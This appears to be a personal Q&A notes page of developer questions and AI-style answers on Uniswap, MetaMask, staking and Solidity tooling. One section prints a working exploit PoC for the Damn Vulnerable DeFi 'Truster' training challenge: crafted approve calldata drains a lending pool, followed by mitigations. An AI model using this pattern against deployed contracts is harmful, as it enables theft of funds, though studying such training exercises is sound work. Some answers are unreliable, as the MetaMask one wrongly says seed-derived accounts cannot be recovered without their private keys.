traditional constant product market maker (like Uniswap V2), you use <code>k = x * y</code> (where <code>x</code> and <code>y</code> are the reserves). In Uniswap V3, this is transformed into <code>sqrt(k)</code>, enabling more efficient and granular liquidity and trade calculations without needing to recompute <code>k</code> or its square root every time.</p><p>By using <code>sqrtPriceX96</code>, the DEX can achieve high precision and efficiency, especially when handling a wide range of token pairs with vastly different values.</p><p></p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://thequestioners.joesexperiences.com/qaas/746">Sooo uhhh, computeSqrtPriceX96 is even more computationally expensive, cuz it uses sqrt no?</a></p>

<h2>Sooo uhhh, computeSqrtPriceX96 is even more computationally expensive, cuz it uses sqrt no?</h2>
<p>You're right that <code>computeSqrtPriceX96</code> involves a square root calculation, which can be computationally expensive. However, the <strong>real benefit</strong> of using <code>sqrtPriceX96</code> in <strong>Uniswap V3</strong> or similar designs is <strong>precision</strong> and <strong>efficiency over time</strong>, not just a one-time computation.</p><p>Here's why it's <strong>not necessarily more expensive in practice</strong>:</p><h3>Key Points:</h3><ol><li><p><strong>One-Time Calculation</strong>:</p><ul><li><p><code>computeSqrtPriceX96</code> calculates the square root <strong>once</strong> and encodes it in a fixed-point format. This value is used to represent the price throughout various operations in the DEX.</p></li><li><p>After this initial computation, <strong>other operations (like liquidity and price calculations)</strong> can avoid redoing the square root and instead use simple arithmetic with the precomputed <code>sqrtPriceX96</code>.</p></li></ul></li><li><p><strong>Efficient Arithmetic</strong>:</p><ul><li><p>The fixed-point representation allows for <strong>precise arithmetic operations</strong> without needing to perform the square root again.</p></li><li><p>Liquidity management, fee calculations, and price adjustments become more efficient since they rely on multiplications and divisions using <code>sqrtPriceX96</code>, which are cheaper than recalculating the square root repeatedly.</p></li></ul></li><li><p><strong>Avoiding Repeated Sqrt</strong>:</p><ul><li><p>Without <code>sqrtPriceX96</code>, you might need to compute the square root multiple times during swaps, liquidity adjustments, and fee calculations.</p></li><li><p>Using <code>sqrtPriceX96</code>, you <strong>compute the square root once</strong> and leverage it across multiple transactions, <strong>saving gas</strong> in the long run.</p></li></ul></li><li><p><strong>Precision in Range-Based Liquidity</strong>:</p><ul><li><p>In Uniswap V3, liquidity is provided within specific price ranges. The <code>sqrtPriceX96</code> allows for <strong>precise tracking of these ranges</strong>, reducing the potential for rounding errors that could accumulate over many transactions.</p></li></ul></li></ol><h3>Example of Gas Saving:</h3><ul><li><p><strong>Without </strong><code>sqrtPriceX96</code>: Every time you adjust liquidity or perform a swap, you might calculate the square root again.</p></li><li><p><strong>With </strong><code>sqrtPriceX96</code>: You store a precomputed value, reducing the need for repetitive square root operations, saving gas over many transactions.</p></li></ul><p>In summary, <code>computeSqrtPriceX96</code><strong> may seem more expensive initially</strong> because of the square root operation, but it saves gas in <strong>repeated operations</strong> by reducing the need to compute the square root multiple times, leveraging efficient fixed-point arithmetic instead. This trade-off is why it‚Äôs preferred in designs like Uniswap V3.</p>

<h2>MetaMask doesn't automatically load all accounts from the same seed phrase</h2>
<p>OKay so I have a metamask right and I connected to it with my pass phrase the 16 or how many words. So I have my account at 0x2bEF0cb9F2F87bb605290f5a2112d57CfCe5c33A but then I previously on another pc had 0x7a97620D02ADA6441d9d6c7CCCC625d8D943D776 account and now I finally recovered it by using my old private key. So whats the catch here? How come I didnt have access to the second one right away without providing the private key?</p><p></p><p>The reason you had to provide the private key for your second account is because <strong>MetaMask doesn't automatically load all accounts from the same seed phrase</strong> unless those accounts are explicitly derived from it.</p><p>Here's how it works:</p><ol><li><p><strong>Seed Phrase and Account Derivation</strong>: When you first created your MetaMask wallet, it generated a seed phrase (the 12 or 24 words). This seed phrase can be used to derive multiple private keys, each corresponding to a different account in your wallet. MetaMask typically shows you the first account derived from your seed phrase by default, but it can also derive additional accounts (the second, third, etc.).</p></li><li><p><strong>Accounts Derived from the Seed Phrase</strong>: MetaMask generates a hierarchical tree of accounts from that single seed phrase using a standard called <strong>HD (Hierarchical Deterministic) wallets</strong>. Each account is derived from the seed phrase using a different "path." By default, MetaMask only shows the first account derived from the default path. If you created multiple accounts, they might be stored in different paths, and you'll need to manually add or import them using the private key for those specific accounts.</p></li><li><p><strong>Private Key</strong>: The private key corresponds to a specific account derived from your seed phrase. Even if you recover your wallet using the same seed phrase, you need the private key or the specific account path to access other accounts (like the one you had on another PC).</p></li></ol><p>So, in summary:</p><ul><li><p>Your <strong>first account</strong> was automatically available because it was the default account derived from your seed phrase.</p></li><li><p>Your <strong>second account</strong> existed as a different account derived from the same seed phrase, but you had to explicitly provide its private key (or add the account through MetaMask using the private key) to gain access to it.</p></li></ul><p>Once you import the private key for the second account into your MetaMask, it will show up alongside your first account.</p><p></p><p>That's kinda stupid man, if you dont have the private key for the second account then its gone forever</p><p></p><p>Yes, if you <strong>don't have the private key</strong> for a specific account, and you don‚Äôt have the recovery phrase or seed phrase that can generate it, then <strong>that specific account is effectively gone</strong> ‚Äî at least from the perspective of being able to access or control it.</p><p>Here‚Äôs why:</p><ul><li><p>The <strong>private key</strong> is what allows you to sign transactions and control an account. Without it, even if you have the seed phrase, MetaMask (or any wallet) doesn't automatically show you all the accounts. You need the <strong>private key</strong> or the <strong>specific derivation path</strong> to import that particular account.</p></li><li><p><strong>Seed phrase</strong> can be used to regenerate all accounts derived from it, but the seed phrase alone won't show you accounts you haven't explicitly created or requested via the private key.</p></li></ul><p>So if you lost the private key for your second account and haven't backed it up, <strong>you won't be able to access or control that specific account anymore</strong>. However, <strong>as long as you have the seed phrase</strong>, all other accounts that were derived from it are still recoverable, and any new accounts can be created.</p><p>The key takeaway here: <strong>Always back up your private keys</strong> and <strong>account information</strong> in a secure way to avoid losing access.</p><p></p><p>So if you have funds on that one and you dont have the private key you cant get the funds out anymore right?</p><p>Yes, <strong>that's correct</strong> ‚Äî if you have funds on an account and you <strong>lose access to the private key</strong> (and you don't have the recovery phrase or the specific derivation path for that account), you <strong>cannot access the funds</strong> or perform any transactions with that account anymore.</p>

<h2>Round up/down number to nearest whole number in solidity</h2>
<pre><code>function roundUpToNearestWhole(uint256 value) public pure returns (uint256) {
    // If there's any remainder when dividing by 1e18, round up
    if (value % 1e18 != 0) {
        return ((value / 1e18) + 1) * 1e18;
    }
    return value;
}

function roundDownToNearestWhole(uint256 value) public pure returns (uint256) {
    // Simply truncate any remainder by dividing and multiplying by 1e18
    return (value / 1e18) * 1e18;
}</code></pre>

<h2>Whats more used v2 or v3 now and why?</h2>
<p>As of now, <strong>Uniswap V3</strong> is more widely used than <strong>Uniswap V2</strong>. The primary reasons for this shift include:</p><ol><li><p><strong>Enhanced Efficiency</strong>: V3 introduces concentrated liquidity, allowing liquidity providers to allocate their capital more efficiently within specific price ranges. This results in better capital utilization and potentially higher fees for liquidity providers.</p></li><li><p><strong>Customization</strong>: V3 offers multiple fee tiers and greater customization options, enabling more tailored liquidity provision strategies.</p></li><li><p><strong>Improved Gas Efficiency</strong>: Although initial transactions can be more complex, V3 is designed to be more gas-efficient in the long run, particularly for high-volume trades and concentrated liquidity pools.</p></li><li><p><strong>Adoption</strong>: Most new liquidity and trading volume have moved to V3 due to these advantages, making it the preferred version for both traders and liquidity providers.</p></li></ol><p>However, <strong>Uniswap V2</strong> still holds a significant amount of liquidity and is used by some for its simplicity and familiarity, especially for certain token pairs that haven't migrated to V3.</p>

<h2>Adding staking contract to a DEX</h2>
<p>If I wanted to implement this, should I make it in a new contract called Stake or should I implement it in the same contract I have my DEX with swaps, addingLiquidity, removingLiquidity? </p><p>It's generally a good idea to <strong>separate concerns</strong> by implementing the staking and reward distribution logic in a <strong>new contract</strong>. Here‚Äôs why:</p><h3>Reasons to Use a Separate Contract</h3><ol><li><p><strong>Separation of Concerns</strong>:</p><ul><li><p>Keeping the staking logic separate from the DEX operations (swaps, adding/removing liquidity) makes your codebase cleaner and easier to manage. Each contract will have a specific, well-defined purpose.</p></li></ul></li><li><p><strong>Modularity</strong>:</p><ul><li><p>You can upgrade or modify the staking logic without affecting the core DEX functionality. This modular approach also makes it easier to audit and maintain each part of your system independently.</p></li></ul></li><li><p><strong>Security</strong>:</p><ul><li><p>A separate contract can minimize the risk of vulnerabilities affecting both systems. If one part has a bug, it doesn‚Äôt compromise the other.</p></li></ul></li><li><p><strong>Flexibility</strong>:</p><ul><li><p>A standalone staking contract can be reused or extended for other purposes or in other projects. It makes your system more adaptable to changes and new features.</p></li></ul></li><li><p><strong>Upgradability</strong>:</p><ul><li><p>If you plan to upgrade or iterate on the staking mechanism (e.g., adjusting reward rates or adding new features), having it in a separate contract makes these changes more straightforward.</p></li></ul></li></ol><h3>Interaction Between Contracts</h3><ul><li><p><strong>Staking Contract</strong>: This handles the staking logic, rewards distribution, and tracking of staked amounts.</p></li><li><p><strong>DEX Contract</strong>: This manages swaps, adding/removing liquidity, and other DEX-specific operations.</p></li><li><p>The two contracts can interact by sharing information about LP tokens, such as querying the total staked amount or validating the user's LP token holdings.</p></li></ul><h3>Summary</h3><p>Implementing the staking logic in a <strong>separate </strong><code>Stake</code><strong> contract</strong> is the best practice for better maintainability, security, and flexibility. Would you like more details on how the two contracts could interact, or do you need help with designing the contract interfaces?</p><p></p><p></p><p>So what do I need in a staking contract? Stake, withdraw, updateRewards functions, anything else?</p><h3>1. <strong>Core Functions</strong></h3><ul><li><p><code>stake(uint256 amount)</code>: Allows users to stake LP tokens into the contract.</p></li><li><p><code>withdraw(uint256 amount)</code>: Allows users to withdraw their staked tokens.</p></li><li><p><code>updateRewards(address user)</code>: Calculates and distributes rewards based on the user's stake and share of the total liquidity pool.</p></li><li><p><code>claimRewards()</code>: Allows users to claim the rewards they‚Äôve accumulated, instead of doing it automatically during every <code>stake</code> or <code>withdraw</code> call. This gives the user control over when to claim.</p></li></ul><h3>2. <strong>Additional Functions and Features</strong></h3><ul><li><p><code>getUserRewards(address user)</code>: A view function that allows users to check their pending rewards without making a transaction.</p></li><li><p><code>getTotalStaked()</code>: A view function that returns the total amount of tokens staked in the contract. This is useful for calculating user shares of the rewards.</p></li><li><p><code>emergencyWithdraw()</code>: This allows users to withdraw their staked tokens without claiming rewards (in case of an emergency or if they want to exit the staking program early). It's a common feature in staking contracts for user convenience and security.</p></li><li><p><code>setRewardRate(uint256 newRate)</code>: Allows the admin to adjust the reward rate, in case there needs to be changes to how rewards are distributed (e.g., inflation adjustments, market conditions, etc.).</p></li><li><p>**<code>pause()</code> and <code>unpause()</code>: These functions allow the admin to pause or resume the staking contract in case of emergency (e.g., if a vulnerability is discovered).</p></li><li><p><code>rewardDebt</code>: While this isn‚Äôt a function itself, you will need a storage variable to keep track of the rewards that have been paid out to each user, ensuring that you don't double-count rewards.</p></li></ul><h3>3. <strong>Modifiers for Security</strong></h3><ul><li><p><code>onlyOwner</code>: Restrict certain functions, like <code>setRewardRate</code>, <code>pause</code>, and <code>unpause</code>, to the contract owner or a governance system.</p></li><li><p><code>nonReentrant</code>: To prevent reentrancy attacks, which can occur during token transfers (especially important in contracts that transfer funds or tokens).</p></li><li><p><code>whenNotPaused</code>: Ensure that staking or withdrawing operations cannot occur when the contract is paused.</p></li></ul><h3>4. <strong>Events</strong></h3><ul><li><p><code>Staked(address indexed user, uint256 amount)</code>: Emit an event when a user stakes tokens.</p></li><li><p><code>Withdrawn(address indexed user, uint256 amount)</code>: Emit an event when a user withdraws tokens.</p></li><li><p><code>RewardsClaimed(address indexed user, uint256 rewardAmount)</code>: Emit an event when rewards are claimed.</p></li></ul><h3>5. <strong>State Variables</strong></h3><ul><li><p><code>totalStaked</code>: The total amount of tokens staked by all users.</p></li><li><p><code>rewardRate</code>: The rate at which rewards are distributed (could be fixed or dynamic).</p></li><li><p><code>lastUpdateBlock</code>: The block at which the rewards were last updated, used to calculate rewards between updates.</p></li><li><p><code>rewardDebt</code>: Keeps track of the rewards already paid out to each user to avoid double counting.</p></li></ul>

<h2>Stakers VS Liquidity Providers</h2>
<h3>Key Differences</h3><ul><li><p><strong>Functionality</strong>: LPs provide liquidity for trading pairs; stakers lock tokens for governance, security, or reward mechanisms.</p></li><li><p><strong>Rewards</strong>: LPs earn from trading fees and possibly extra incentives; stakers earn from network incentives, governance participation, or protocol rewards.</p></li><li><p><strong>Risk</strong>: LPs deal with impermanent loss; stakers usually face minimal risks except for token price volatility.</p></li></ul>

<h2>Staking Explained</h2>
<p>Sooo lets say stakers lock their ETH for the protocol token, this way they kind of add value to the token right? They believe the token will go up. They might lose money if it goes down compared to ETH right?</p><p>Exactly! Here's a more detailed breakdown:</p><h3>Staking ETH for the Protocol Token</h3><ul><li><p><strong>Mechanism</strong>: When users stake their ETH in your DEX, they receive rewards in the form of your protocol's native token. This process effectively locks up their ETH, reducing its circulating supply, and encourages long-term commitment to your platform.</p></li><li><p><strong>Value Addition</strong>: By staking ETH and receiving your protocol token as a reward, stakers show confidence in your platform and its future potential. This <strong>adds value</strong> to the protocol token because it reflects a belief in the protocol‚Äôs growth and utility.</p></li></ul><h3>Potential Upside and Risks for Stakers</h3><ul><li><p><strong>Upside</strong>: Stakers are betting that the value of the protocol token will <strong>increase</strong> over time. If your platform gains more users, trading volume, and community support, the demand for the protocol token could rise, leading to higher prices.</p></li><li><p><strong>Downside</strong>: Stakers face the risk that the protocol token‚Äôs value could <strong>decrease</strong> compared to ETH. If the token's price falls, the stakers could end up with rewards that are worth less than their initial ETH stake would have been if held instead of staked.</p></li></ul><h3>Summary of Risk and Belief</h3><ul><li><p><strong>Belief</strong>: Stakers are expressing a belief that the protocol token will appreciate or at least hold value.</p></li><li><p><strong>Risk</strong>: They risk <strong>opportunity cost</strong>‚Äîif the protocol token doesn‚Äôt perform well, they might have been better off holding ETH, especially if ETH appreciates more than the protocol token.</p></li></ul><p>This mechanism helps bootstrap your DEX‚Äôs ecosystem by aligning the incentives of users and the protocol.</p>

<h2>Fairness of swaps in DEX</h2>
<p>What do you think sir: So I have a pool of 1000 token0 and 500 token1. User wants to swap 7 token0 for whatever amount token1. The ratio is 1000:500 = 2:1 So the user should get for his 7 token0, 7/2 = 3,... token1 but ERC20 does only allow sending integer numbers, so I have to send him 3 token1 and rip him off a bit. But then I could make it so that he only pays 6 token0 for his 3 token1 instead of 7 token0. That would be much fairer no? Send him the 1 token0 back haha</p><p></p><p>Your approach to making the swap fairer by adjusting the amount of <code>token0</code> the user pays is a good idea.</p><p>This way, the user gets a fairer deal, and you maintain integrity in the swapping process. This approach also enhances user satisfaction by showing you're considerate about fairness in transactions.</p><p></p><p>How does uniswap deal with this kind of problem?</p><p>If the user is going to receive a fraction of a token, Uniswap doesn't necessarily refund any "extra" amount. It simply rounds down and passes that fraction in the form of slippage. You don't see a refund unless the slippage tolerance setting is large enough to allow for minor losses on the user‚Äôs part.</p><p>In your case, instead of charging the user for more <code>token0</code> than they should be paying, you could implement a <strong>slippage tolerance</strong> mechanism or round the output slightly to ensure fairness. However, providing a "refund" of the excess <code>token0</code> could create a more intuitive user experience.</p><p>You could also provide the user with a way to specify their slippage tolerance (as Uniswap does) to allow them some flexibility in how much slippage they are willing to accept.</p>

<h2>How to get max uint256 in solidity</h2>
<pre><code>type(uint256).max</code></pre>

<h2>How to add console log in foundry?</h2>
<p>Install forge-std</p>

<pre><code>forge install foundry-rs/forge-std</code></pre><p>Use it</p>

<pre><code>pragma solidity ^0.8.0;

    import "forge-std/console.sol";
    
    contract MyContract {
        uint256 public myValue;
    
        function setValue(uint256 _value) public {
            myValue = _value;
            console.log("Value set to:", myValue);
        }
    }</code></pre>

<h2>Whats the reason for uniswap to upgrade to v3</h2>
<p>Uniswap upgraded to <strong>v3</strong> to introduce several key improvements and features over v2, addressing various inefficiencies and enhancing the protocol's flexibility and capital efficiency. Here are the main reasons for the upgrade:</p><h3>1. <strong>Concentrated Liquidity</strong></h3><ul><li><p>In <strong>v3</strong>, liquidity providers (LPs) can allocate their capital to specific price ranges, rather than spreading it uniformly across the entire price curve. This allows LPs to provide liquidity only where they expect the most trading activity, significantly increasing capital efficiency.</p></li><li><p><strong>v2</strong> required LPs to provide liquidity across the entire price range from 0 to infinity, which often resulted in underutilized capital.</p></li></ul><h3>2. <strong>Multiple Fee Tiers</strong></h3><ul><li><p><strong>v3</strong> allows pools to have multiple fee tiers (0.05%, 0.30%, and 1%) depending on the volatility of the trading pairs. This provides more options for LPs to choose a fee structure that aligns with the risk they are willing to take.</p></li><li><p><strong>v2</strong> had a fixed fee of 0.30% for all pools, which wasn't flexible for different types of pairs.</p></li></ul><h3>3. <strong>Increased Capital Efficiency</strong></h3><ul><li><p>With concentrated liquidity, <strong>v3</strong> enables LPs to use their capital more efficiently. They can earn the same amount of fees as they would in <strong>v2</strong> with a fraction of the capital, which is especially beneficial for stable pairs like USDC/USDT.</p></li></ul><h3>4. <strong>Improved Trade Execution</strong></h3><ul><li><p><strong>v3</strong> provides better price execution for traders due to the more efficient use of liquidity. This leads to lower slippage and better price quotes for large trades.</p></li></ul><h3>5. <strong>Non-Fungible Liquidity Positions</strong></h3><ul><li><p>In <strong>v3</strong>, liquidity positions are represented as non-fungible tokens (NFTs), each with its own unique price range. This is a departure from <strong>v2</strong>, where liquidity positions were fungible tokens (ERC-20).</p></li></ul><h3>6. <strong>Flexible Trading Strategies</strong></h3><ul><li><p><strong>v3</strong> enables more sophisticated trading strategies by allowing LPs to provide liquidity across different price ranges and manage their positions actively, which wasn't possible in <strong>v2</strong>.</p></li></ul><p>Overall, Uniswap <strong>v3</strong> was designed to improve the user experience for both liquidity providers and traders by making the protocol more efficient, flexible, and competitive in the decentralized exchange (DEX) space.</p>

<h1>What does target.functionCall(data) do in solidity?</h1>
<p>In Solidity, <code>target.functionCall(data)</code> is a low-level function call used to call a function on the <code>target</code> address with the provided <code>data</code> payload. Here's a breakdown of what this does:</p><ol><li><p><code>target</code>: This is an <code>address</code> type variable that represents the contract you want to call a function on.</p></li><li><p><code>functionCall</code>: This is a utility function provided by the <code>Address</code> library in OpenZeppelin. It is a safer alternative to the low-level <code>call</code> function in Solidity, which is used to send data to a contract and invoke a function.</p></li><li><p><code>data</code>: This is a <code>bytes</code> type variable that contains the encoded function signature and parameters you want to pass to the function you are calling.</p></li></ol><h3>Purpose and Safety</h3><ul><li><p><strong>Safety</strong>: <code>functionCall</code> checks if the <code>target</code> is a contract and reverts if the call fails. This prevents accidentally sending calls to non-contract addresses.</p></li><li><p><strong>Error Handling</strong>: If the call fails, it reverts with an appropriate error message, making it easier to debug.</p></li></ul><p></p><h3>Example</h3><pre><code>bytes memory data = abi.encodeWithSignature("foo(uint256)", 123);
    target.functionCall(data);</code></pre><p></p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://thequestioners.joesexperiences.com/qaas/763">How to Exploit target.function(call) with arbitrary data</a></p>

<h2>How to exploit target.functionCall(data) with arbitrary data</h2>
<h3>Exploit Overview:</h3><ol><li><p>The <code>flashLoan</code> function allows any external contract (<code>target</code>) to be called with arbitrary data (<code>data</code>).</p></li><li><p>An attacker can use this to approve the attacker‚Äôs own address to spend all tokens from the <code>TrusterLenderPool</code>.</p></li><li><p>Once approved, the attacker can transfer all tokens from the pool to their own address.</p></li></ol><p></p><h3>Steps for the Exploit:</h3><ol><li><p>The <code>attack</code> function initiates the exploit.</p></li><li><p>The <code>flashLoan</code> function is called with <code>amount</code> set to <code>0</code>, so no actual loan is taken.</p></li><li><p>The <code>data</code> argument is crafted to call the <code>approve</code> function on the <code>DamnValuableToken</code> contract, approving the exploit contract to spend the pool‚Äôs tokens.</p></li><li><p>After the <code>flashLoan</code> call, the <code>transferFrom</code> function is used to move all tokens from the pool to the attacker's address.</p></li></ol><p></p><h3>Key Issues:</h3><ul><li><p><strong>Arbitrary Function Execution</strong>: The contract allows calling any function on any contract through <code>target.functionCall(data)</code> without checks.</p></li><li><p><strong>No Validation</strong>: There is no validation of what function is being called or the purpose of the external call.</p></li></ul><h3>Mitigation:</h3><ul><li><p>Restrict the <code>target</code> to trusted contracts.</p></li><li><p>Implement validation logic for the <code>data</code> to ensure only safe and intended operations can be performed.</p></li></ul><p></p><p>Contract</p>
How to exploit this simple anwser poc

<pre><code>
    // SPDX-License-Identifier: MIT
    // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
    pragma solidity =0.8.25;
    
    import {Address} from "@openzeppelin/contracts/utils/Address.sol";
    import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
    import {DamnValuableToken} from "../DamnValuableToken.sol";
    
    contract TrusterLenderPool is ReentrancyGuard {
        using Address for address;
    
        DamnValuableToken public immutable token;
    
        error RepayFailed();
    
        constructor(DamnValuableToken _token) {
            token = _token;
        }
    
        function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
            external
            nonReentrant
            returns (bool)
        {
            uint256 balanceBefore = token.balanceOf(address(this));
    
            token.transfer(borrower, amount);
            target.functionCall(data);
    
            if (token.balanceOf(address(this)) &lt; balanceBefore) {
                revert RepayFailed();
            }
    
            return true;
        }
    }</code></pre>
    
<p>Exploit PoC</p>

<pre><code>// SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    import "../DamnValuableToken.sol";
    import "../TrusterLenderPool.sol";
    
    contract Exploit {
        DamnValuableToken public immutable token;
        TrusterLenderPool public immutable pool;
    
        constructor(DamnValuableToken _token, TrusterLenderPool _pool) {
            token = _token;
            pool = _pool;
        }
    
        function attack() external {
            uint256 poolBalance = token.balanceOf(address(pool));
    
            // Prepare the data for the approve function call
            bytes memory data = abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this), // Approve the exploit contract to spend tokens
                poolBalance    // Approve for the full balance of the pool
            );
    
            // Call the flashLoan with the crafted data
            pool.flashLoan(0, msg.sender, address(token), data);
    
            // Now transfer the tokens to the attacker
            token.transferFrom(address(pool), msg.sender, poolBalance);
        }
    }</code></pre><p></p>

<h2>What does the approve function in ERC20 token contract do?</h2>
<p>The <code>approve</code> function in an ERC20 token contract allows a user to give permission to another address (usually a smart contract) to spend a specific amount of their tokens. It sets an allowance, which the spender can then use to transfer tokens from the owner's balance.</p><p></p><p>Why would we want to do that?</p><p>We use the <code>approve</code> function to allow smart contracts, such as decentralized exchanges or lending platforms, to manage tokens on our behalf. This is necessary for enabling functions like:</p><ul><li><p><strong>Swapping tokens</strong>: On decentralized exchanges, you approve the exchange contract to spend your tokens to facilitate trades.</p></li><li><p><strong>Staking tokens</strong>: In staking platforms, you approve the contract to transfer your tokens into a staking pool.</p></li><li><p><strong>Lending and borrowing</strong>: In lending platforms, you approve the protocol to manage your tokens for lending or collateral purposes.</p><p></p></li></ul><p>This mechanism ensures that you retain control over your tokens while allowing trusted contracts to perform operations with them as needed.</p><p></p><p>Once you approve the tokens then they can use transferFrom to take the tokens?</p><p>Yes, exactly. Once you approve a certain amount of tokens for a smart contract or address, that contract or address can use the <code>transferFrom</code> function to take those tokens from your balance, up to the approved amount. This is commonly used to automate transactions without requiring manual approval for each transfer.</p><p></p><ul><li><p><code>approve</code><strong> + </strong><code>transferFrom</code>: This combination is used when a smart contract or another address needs permission to transfer tokens on your behalf. After you approve a specific amount, the contract can call <code>transferFrom</code> to move those tokens from your balance to another address.</p></li><li><p><code>transfer</code>: This is used when you want to directly send tokens from your account to another address. It doesn't require any prior approval since you are initiating the transfer yourself.</p></li></ul><p></p><h3>Safe Practices:</h3><ul><li><p><code>approve</code><strong> and </strong><code>transferFrom</code><strong> pattern</strong>: Be aware of the "double-spending" issue where users might mistakenly approve more tokens if <code>approve</code> is called multiple times. This can be mitigated by first setting the allowance to zero before updating it.</p></li></ul>

<h1>What are Weird ERC20 tokens?</h1>
<p><strong>Weird ERC20</strong> tokens deviate from the standard ERC20 implementation in ways that can cause unexpected behavior. Here's what you should watch out for:</p><h3>Common "Weird" ERC20 Behaviors:</h3><ol><li><p><code>transfer</code><strong> or </strong><code>transferFrom</code><strong> Returning </strong><code>false</code><strong> Instead of Reverting</strong>:</p><ul><li><p>Standard ERC20 should revert on failure, but some implementations return <code>false</code>. Contracts interacting with such tokens should handle these cases explicitly.</p></li></ul></li><li><p><code>transfer</code><strong> or </strong><code>transferFrom</code><strong> Always Succeeding</strong>:</p><ul><li><p>Some tokens don't check for sufficient balances and allow transactions that shouldn't be possible. This could lead to unexpected results when interacting with such tokens.</p></li></ul></li><li><p><strong>Changing Decimal Places</strong>:</p><ul><li><p>While 18 decimals is the norm, some ERC20 tokens use different decimal places (e.g., 0 or 6), which can affect calculations and display.</p></li></ul></li><li><p><strong>Custom Logic in </strong><code>transfer</code><strong> or </strong><code>transferFrom</code>:</p><ul><li><p>Some tokens include additional logic (e.g., fees, automatic burning) within these functions, which can change the amount transferred or the token‚Äôs supply.</p></li></ul></li><li><p><strong>No </strong><code>transfer</code><strong> or </strong><code>transferFrom</code><strong> at All</strong>:</p><ul><li><p>Some tokens don‚Äôt implement these functions and require interaction through other custom methods.</p></li></ul></li><li><p><strong>Reverting in </strong><code>balanceOf</code><strong> or </strong><code>allowance</code>:</p><ul><li><p>Instead of returning zero for accounts with no balance or allowance, some tokens may revert, causing issues in contracts expecting a return value.</p></li></ul></li><li><p><strong>Token Contracts That Self-Destruct</strong>:</p><ul><li><p>A token contract might self-destruct, making its tokens non-transferable or inaccessible.</p></li></ul></li></ol><p></p><h3>How to Handle Weird ERC20s:</h3><ol><li><p><strong>Check Return Values</strong>: Always check the return value of <code>transfer</code> and <code>transferFrom</code> instead of assuming success.</p></li><li><p><strong>Handle Reverts and Returns</strong>: Be prepared to handle both reverts and <code>false</code> returns.</p></li><li><p><strong>Adapt to Decimals</strong>: Always use the <code>decimals()</code> function to determine the token's precision.</p></li><li><p><strong>Audit Contracts</strong>: For critical contracts, audit the specific ERC20 implementation to understand any deviations.</p></li></ol>

<h2>How to format solidity code in nvim?</h2>
<p>install prettier in your project</p><p>npm i prettier-plugin-solidity</p><p></p><p>Add .prettierrc to your project</p><pre><code>{
    "plugins": ["prettier-plugin-solidity"],
  }</code></pre><p></p><p>Call this to edit all the sol files in your directory</p><pre><code>npx prettier --write '**/*.sol'</code></pre><p></p><p>Or call formatting for individual files</p><pre><code>npx prettier --write yourfile.sol</code></pre><p></p><p>Or just add it to your lua config in nvim</p><pre><code>vim.api.nvim_set_keymap('n', '&lt;leader&gt;fs', ':!npx prettier --write %&lt;CR&gt;', { noremap = true, silent = true })</code></pre>

<h2>Is the assembly in solidity the same as regular assembly?</h2>
<p>No, the <strong>assembly in Solidity</strong> is not the same as regular assembly language used in traditional CPUs (like x86 or ARM). They differ in purpose, architecture, and syntax. Here's a detailed comparison:</p><hr><h3><strong>1. Purpose and Environment</strong></h3><ul><li><p><strong>Regular Assembly (e.g., x86/ARM)</strong>:</p><ul><li><p>Low-level instructions executed by physical hardware (CPU).</p></li><li><p>Directly interacts with memory, registers, and hardware components.</p></li></ul></li><li><p><strong>Solidity Assembly (EVM Assembly)</strong>:</p><ul><li><p>Low-level instructions executed by the Ethereum Virtual Machine (EVM), a virtualized execution environment.</p></li><li><p>Operates within the EVM's stack-based architecture, with no direct access to traditional hardware resources.</p></li></ul></li></ul><hr><h3><strong>2. Architecture</strong></h3><ul><li><p><strong>Regular Assembly</strong>:</p><ul><li><p>Typically register-based, where instructions operate on specific registers (e.g., <code>eax</code>, <code>rbx</code>).</p></li><li><p>Uses instructions to manipulate memory, registers, and CPU flags.</p></li></ul></li><li><p><strong>Solidity Assembly</strong>:</p><ul><li><p><strong>Stack-based</strong> architecture:</p><ul><li><p>Operates on a stack with a depth of 1024 elements.</p></li><li><p>Instructions pop data from the stack and push results back onto it.</p></li></ul></li><li><p>Memory and storage are explicitly managed using opcodes like <code>MSTORE</code>, <code>MLOAD</code>, <code>SSTORE</code>, and <code>SLOAD</code>.</p></li></ul></li></ul><hr><h3><strong>3. Syntax</strong></h3><ul><li><p><strong>Regular Assembly</strong>:</p></li></ul><ul><li><p>Instructions are specific to the CPU architecture and may include directives and macros.</p></li><li><p>Example (x86 assembly):</p></li></ul><pre><code class="language-assembly">mov eax, 1    ; Load 1 into the eax register 
    add eax, 2    ; Add 2 to eax </code></pre><ul><li><p><strong>Solidity Assembly (EVM Assembly)</strong>:</p></li></ul><ul><li><p>Instructions are EVM-specific opcodes.</p></li><li><p>Example:</p></li></ul><pre><code class="language-assembly">PUSH1 0x01    // Push 1 onto the stack 
    PUSH1 0x02    // Push 2 onto the stack 
    ADD           // Add the top two values on the stack </code></pre><p></p><hr><h3><strong>4. Instruction Set</strong></h3><ul><li><p><strong>Regular Assembly</strong>:</p><ul><li><p>Rich and varied instruction sets with support for arithmetic, branching, I/O, and system-level operations.</p></li><li><p>Examples: <code>MOV</code>, <code>ADD</code>, <code>SUB</code>, <code>MUL</code>, <code>JMP</code>, <code>INT</code>.</p></li></ul></li><li><p><strong>Solidity Assembly</strong>:</p><ul><li><p>Limited to the EVM's instruction set (about 140 opcodes in Ethereum).</p></li><li><p>Examples: <code>PUSH</code>, <code>ADD</code>, <code>CALL</code>, <code>MSTORE</code>, <code>LOG1</code>.</p></li></ul></li></ul><hr><h3><strong>5. Accessibility</strong></h3><ul><li><p><strong>Regular Assembly</strong>:</p><ul><li><p>Directly interfaces with hardware resources, allowing tasks like interrupt handling, port I/O, and direct memory access.</p></li></ul></li><li><p><strong>Solidity Assembly</strong>:</p><ul><li><p>Limited to the EVM's environment. It interacts with:</p><ul><li><p><strong>Stack</strong>: Temporary storage for calculations.</p></li><li><p><strong>Memory</strong>: Volatile, cleared after execution.</p></li><li><p><strong>Storage</strong>: Persistent storage specific to smart contracts.</p></li><li><p><strong>Logs</strong>: Event data for external access.</p></li></ul></li></ul></li></ul><hr><h3><strong>6. Gas Costs (EVM Specific)</strong></h3><ul><li><p><strong>Regular Assembly</strong>:</p><ul><li><p>No concept of "gas costs."</p></li><li><p>Code efficiency is measured in terms of execution speed and memory 